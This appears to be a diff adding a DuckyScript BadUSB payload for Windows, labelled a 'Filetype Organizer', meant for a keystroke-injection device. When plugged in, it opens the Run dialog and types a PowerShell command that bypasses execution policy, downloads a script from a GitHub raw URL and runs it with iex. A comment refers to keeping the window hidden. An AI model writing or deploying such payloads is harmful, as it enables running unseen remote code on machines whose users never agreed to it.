@@ -1,0 +1,16 @@
+
+REM Title: Filetype Organizer
+REM Author: @beigeworm
+REM Description: This script searches the users folder for any files with a specific filetype and copies them to the user folder.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -C cd $env:USERPROFILE ;irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Filetype-Organizer/main.ps1 | iex
+ENTER
+
